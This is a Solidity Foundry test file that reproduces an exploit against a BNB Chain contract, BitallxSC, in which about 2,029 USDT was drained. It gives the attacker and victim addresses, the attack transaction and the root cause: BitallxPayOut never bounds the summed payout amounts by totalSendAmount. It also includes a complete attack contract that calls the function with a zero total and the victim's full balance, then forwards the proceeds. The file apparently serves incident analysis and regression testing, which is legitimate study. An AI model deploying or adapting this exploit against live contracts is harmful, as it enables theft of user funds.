// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2,029.47 USDT
// Attacker : 0xF499F7a82De632CFd194025A51C88d1b44C8155e
// Attack Contract : 0x81e631FaC80CdaC59b1A5BBC5667AaaCB238965F
// Vulnerable Contract : 0xa5f3728767F834C591eE99C8C5854b752F39C385
// Attack Tx : https://bscscan.com/tx/0x1fe893e4d8370a8d6da590b32f66bd032217bac2e56bd2bf0de2a9df9c7117dd
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xa5f3728767F834C591eE99C8C5854b752F39C385#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1065
//
// Attack summary: The attacker called BitallxPayOut with totalSendAmount = 0 but supplied a payout
// amount equal to the victim contract's USDT balance, so the function transferred existing victim
// funds to the attack contract.
// Root cause: BitallxPayOut checks allowance and balance against totalSendAmount but never checks
// that sum(amount[]) is bounded by totalSendAmount.

address constant ATTACKER = 0xF499F7a82De632CFd194025A51C88d1b44C8155e;
address constant TRACE_ATTACK_CONTRACT = 0x81e631FaC80CdaC59b1A5BBC5667AaaCB238965F;
address constant BITALLX_SC = 0xa5f3728767F834C591eE99C8C5854b752F39C385;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
string constant DEFAULT_BSC_RPC_URL = "https://bsc-mainnet.public.blastapi.io";

interface IBitallxSC {
    function BitallxPayOut(
        address tokencontract,
        address[] calldata wallet,
        uint256[] calldata amount,
        uint256 totalSendAmount
    ) external;
}

interface IBitallxToken {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    address private profitReceiver;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", DEFAULT_BSC_RPC_URL), 49_758_338);

        profitReceiver = makeAddr("profitReceiver");
        fundingToken = USDT_TOKEN;
        attacker = profitReceiver;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(BITALLX_SC, "BitallxSC");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public balanceLog {
        uint256 victimBalance = IBitallxToken(USDT_TOKEN).balanceOf(BITALLX_SC);
        assertEq(victimBalance, 2_029_473_999_999_999_986_000);

        new BitallxPayOutAttack(profitReceiver);

        assertEq(IBitallxToken(USDT_TOKEN).balanceOf(profitReceiver), victimBalance);
        assertEq(IBitallxToken(USDT_TOKEN).balanceOf(BITALLX_SC), 0);
    }
}

contract BitallxPayOutAttack {
    constructor(
        address profitReceiver
    ) {
        IBitallxToken usdt = IBitallxToken(USDT_TOKEN);
        uint256 victimBalance = usdt.balanceOf(BITALLX_SC);

        address[] memory wallets = new address[](1);
        wallets[0] = address(this);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = victimBalance;

        IBitallxSC(BITALLX_SC).BitallxPayOut(USDT_TOKEN, wallets, amounts, 0);

        require(usdt.transfer(profitReceiver, usdt.balanceOf(address(this))), "profit transfer failed");
    }
}
